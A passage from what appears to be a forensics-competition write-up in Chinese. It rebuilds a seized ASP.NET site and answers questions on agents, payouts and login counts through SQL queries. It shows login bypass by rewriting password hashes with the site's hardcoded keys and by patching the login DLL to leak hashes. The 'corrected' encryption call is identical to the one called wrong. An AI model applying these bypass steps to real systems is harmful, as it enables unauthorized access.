&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725201534688.png&#34; alt=&#34;image-20250725201534688&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;并且在之前反编译出来的dll登录逻辑中，我们知道了用户名密码是经过加密的，存放在表里的是加密过的值：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;text2&lt;/span&gt; = &lt;span style=&#34;color:#e06c75&#34;&gt;Encryption&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;AESEncrypt&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;text2&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;forensix&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HL&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;text2&lt;/span&gt; = &lt;span style=&#34;color:#e06c75&#34;&gt;FormsAuthentication&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;HashPasswordForStoringInConfigFile&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;text2&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;MD5&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;二者结合，如果要让某个用户能登录，就要确保他的&lt;code&gt;DU_Id &lt;/code&gt;=&lt;code&gt;TD_Webs.DW_DU_Id&lt;/code&gt;，并且将他的密码改为指定值加密后的结果写入&lt;code&gt;DU_Pwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们先找到用户表：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725201937047&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725201937047.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725201937047.png&#34; alt=&#34;image-20250725201937047&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;在检材二中的chrome浏览器的表单记录中，我们能找到&lt;code&gt;liwente1314520&lt;/code&gt;的登录记录：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725202001107&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725202001107.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725202001107.png&#34; alt=&#34;image-20250725202001107&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;&lt;code&gt;liwente1314520&lt;/code&gt;对应的&lt;code&gt;DU_Id&lt;/code&gt; 是1001，也对应&lt;code&gt;TD_Webs&lt;/code&gt;表里面的aaaa.bbbb，相应&lt;code&gt;DW_Type&lt;/code&gt;是0&lt;/p&gt;
&lt;p&gt;在检材3的登录页面逻辑中我们知道，登录方式是&amp;quot;密码&amp;quot;+&amp;ldquo;OvO&amp;rdquo;&lt;/p&gt;
&lt;p&gt;我们用这种方式制作一个密码，先&lt;code&gt;AESEncrypt&lt;/code&gt;加密，再&lt;code&gt;MD5&lt;/code&gt;加密（这一步我做错了，先别急着复制，往下看）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;Add-Type&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;-Path&lt;/span&gt; &amp;lt;&lt;span style=&#34;color:#e06c75&#34;&gt;Path&lt;/span&gt;/&lt;span style=&#34;color:#e06c75&#34;&gt;to&lt;/span&gt;/&lt;span style=&#34;color:#e06c75&#34;&gt;DBManager&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;dll&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#e06c75&#34;&gt;DBManager.Encryption&lt;/span&gt;]::&lt;span style=&#34;color:#e06c75&#34;&gt;AESEncrypt&lt;/span&gt;( &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;111OvO&amp;#34;&lt;/span&gt;,  &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HL&amp;#34;&lt;/span&gt;,  &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;forensix&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725202857015&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725202857015.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725202857015.png&#34; alt=&#34;image-20250725202857015&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726104821352&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726104821352.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726104821352.png&#34; alt=&#34;image-20250726104821352&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;把1001对应的&lt;code&gt;TD_Webs.DW_DU_Id&lt;/code&gt;改成&lt;code&gt;192.168.1.176&lt;/code&gt;，也就是检材3的ip，让我们能访问：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725204033149&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725204033149.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725204033149.png&#34; alt=&#34;image-20250725204033149&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;&lt;code&gt;TD_User.DW_Pwd&lt;/code&gt;改成加密的密码：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725203546714&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725203546714.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725203546714.png&#34; alt=&#34;image-20250725203546714&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;保存之后，在检材4重启sql1容器，在检材3中开启ASP.NET State Service服务：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725203703493&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725203703493.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725203703493.png&#34; alt=&#34;image-20250725203703493&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;之后可以在本机访问&lt;code&gt;http://192.168.1.176/dl&lt;/code&gt;进行登录操作：&lt;/p&gt;
&lt;p&gt;可是到这一步，我登录竟然不成功！&lt;/p&gt;
&lt;p&gt;我以为是之前的md5没有大写的原因，可是就算我改成了大写，仍旧是不成功&lt;/p&gt;
&lt;p&gt;后面发现是我把加密函数参数位置写错了，正确应该是这样（太铸币了啊）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Add-Type -Path &amp;lt;Path/to/DBManager.dll&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;DBManager.Encryption&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt;::AESEncrypt&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;111OvO&amp;#34;&lt;/span&gt;,  &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HL&amp;#34;&lt;/span&gt;,  &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;forensix&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不过当时我认为走流程自己计算密码这一步显然是走不太通了，那我们就得换一个思路：直接让它为我们输出密码&lt;/p&gt;
&lt;p&gt;进入控制登录的&lt;code&gt;App_Web_dllogin.aspx.7d7c2f33.dll&lt;/code&gt;，在&lt;code&gt;oCmd&lt;/code&gt;函数部分右键，编辑：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726105115927&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726105115927.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726105115927.png&#34; alt=&#34;image-20250726105115927&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;加入和修改这三处，目的是登录失败的时候弹窗弹出当前使用密码加密后的md5值：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726105355723&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726105355723.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726105355723.png&#34; alt=&#34;image-20250726105355723&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;点击编译，注意一定要把上面的非系统引用库也导出并拖进dnspy，否则编译会失败：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726110256769&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726110256769.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726110256769.png&#34; alt=&#34;image-20250726110256769&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;编译完成之后点击保存（名称不能变），复制并替换检材三&lt;code&gt;C:\inetpub\wwwroot\v7w\bin&lt;/code&gt;下的同名dll：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726110912188&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726110912188.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726110912188.png&#34; alt=&#34;image-20250726110912188&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;之后重启网站：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726111008848&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726111008848.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726111008848.png&#34; alt=&#34;image-20250726111008848&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;再次访问&lt;code&gt;http://192.168.1.176/dl&lt;/code&gt;，使用账号&lt;code&gt;liwente1314520&lt;/code&gt;，密码随便（但是一定要记住）登录：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725210243987&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725210243987.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725210243987.png&#34; alt=&#34;image-20250725210243987&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;果然报错，不过也带出了加密后的密码！&lt;/p&gt;
&lt;p&gt;复制这个md5值作为密码，再次更改数据库内容，保存，重启sql1服务&lt;/p&gt;
&lt;p&gt;我们就能使用上一次登录的密码登录了：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726111255320&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726111255320.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726111255320.png&#34; alt=&#34;image-20250726111255320&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;总算是搭建并登录了，也不能忘了我们的目标：嫌疑用户的推广链接中参数里包含的ID&lt;/p&gt;
&lt;p&gt;一同翻找，在代理信息栏里发现了推广链接：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726111732090&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726111732090.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726111732090.png&#34; alt=&#34;image-20250726111732090&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;abe6d2ee630379c3
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;44重构该网站该网站后台的代理用户数量为&#34;&gt;44.重构该网站，该网站后台的代理用户数量为
&lt;/h2&gt;&lt;p&gt;用户列表里面数一下，一共三页：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726111901950&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726111901950.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726111901950.png&#34; alt=&#34;image-20250726111901950&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;26
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;45重构该网站该网站注册用户中共有过几个代理包含删除的数据&#34;&gt;45.重构该网站，该网站注册用户中共有过几个代理(包含删除的数据)
&lt;/h2&gt;&lt;p&gt;上一题是代理用户数量，这一题问的是包括删除的数据，我们就需要找到对应的表&lt;/p&gt;
&lt;p&gt;鼠标移动到用户列表按钮，左下角会显示对应的aspx文件：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726112903759&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726112903759.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726112903759.png&#34; alt=&#34;image-20250726112903759&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;在检材3里面搜索该文件（火眼也行）：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726113233951&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726113233951.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726113233951.png&#34; alt=&#34;image-20250726113233951&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;在文件开头找到使用的库，其实也就是上图我们搜出来的第二个文件：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726113318959&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726113318959.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726113318959.png&#34; alt=&#34;image-20250726113318959&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;导入dnspy分析，同样找到和数据库交互的函数：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726113710556&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726113710556.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726113710556.png&#34; alt=&#34;image-20250726113710556&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;它同样是在&lt;code&gt;WBus&lt;/code&gt;的&lt;code&gt;WUUser&lt;/code&gt;里面，使用的表名是&lt;code&gt;TU_User&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726113910829&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726113910829.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726113910829.png&#34; alt=&#34;image-20250726113910829&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;数据库里面找到该表，统计一下总数：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726112707319&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726112707319.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726112707319.png&#34; alt=&#34;image-20250726112707319&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;32
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;46重构该网站对补发记录进行统计统计-2019-年10-月1日后补发成功的金额总值&#34;&gt;46.重构该网站，对补发记录进行统计，统计 2019 年10 月1日后补发成功的金额总值
&lt;/h2&gt;&lt;p&gt;分析方法和上一题一模一样，就是网站配置文件 -&amp;gt; dll -&amp;gt; 逆向找数据库表&lt;/p&gt;
&lt;p&gt;同样的，我们找到补发测试的文件：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726114230203&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726114230203.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726114230203.png&#34; alt=&#34;image-20250726114230203&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;中间寻找的过程就跳过，直接上逆向结果：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726114726692&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726114726692.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726114726692.png&#34; alt=&#34;image-20250726114726692&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;这里找到的&lt;code&gt;VY_TestLog&lt;/code&gt;不是表，是一个视图：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726114808846&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726114808846.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726114808846.png&#34; alt=&#34;image-20250726114808846&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;在dll里面我们还能知道补发成功的逻辑：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726115007774&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726115007774.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726115007774.png&#34; alt=&#34;image-20250726115007774&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;dataTable&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Rows&lt;/span&gt;[&lt;span style=&#34;color:#e06c75&#34;&gt;i&lt;/span&gt;][&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;YY1T_Type&amp;#34;&lt;/span&gt;].&lt;span style=&#34;color:#e06c75&#34;&gt;ToString&lt;/span&gt;() == &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;也就是说，如果&lt;code&gt;YY1T_CState == &amp;quot;100&amp;quot;&lt;/code&gt;，则认为是成功的&lt;/p&gt;
&lt;p&gt;我们只需要查询视图中&lt;code&gt;YY1T_CState&lt;/code&gt;字段为&lt;code&gt;100&lt;/code&gt;，且&lt;code&gt;YY1T_CDate&lt;/code&gt;在2019.10.1后的补发金额（&lt;code&gt;YY1T_Money&lt;/code&gt;）总值：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;sum&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;YY1T_Money&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;VY_TestLog&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;YY1T_CState&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;YY1T_CDate&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;2019-10-01 00:00:00&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726115817343&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726115817343.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726115817343.png&#34; alt=&#34;image-20250726115817343&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;138408&lt;/span&gt;.&lt;span style=&#34;color:#d19a66&#34;&gt;0000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;47检材-4-中对tx_iplog表进行分析所有在武汉市登录的次数为&#34;&gt;47.检材 4 中，对&amp;quot;TX_IpLog&amp;quot;表进行分析，所有在&amp;quot;武汉市&amp;quot;登录的次数为
&lt;/h2&gt;&lt;p&gt;找到该表：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726115952288&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726115952288.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726115952288.png&#34; alt=&#34;image-20250726115952288&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;没什么弯绕，就是sql查询：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;count&lt;/span&gt;(&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TX_IpLog&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;XIL_Info&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;like&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;%&lt;/span&gt;武汉&lt;span style=&#34;color:#56b6c2&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250726120127294&#34; href=&#34;http://picture.928330.xyz/typora/image-20250726120127294.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250726120127294.png&#34; alt=&#34;image-20250726120127294&#34;  /&gt;
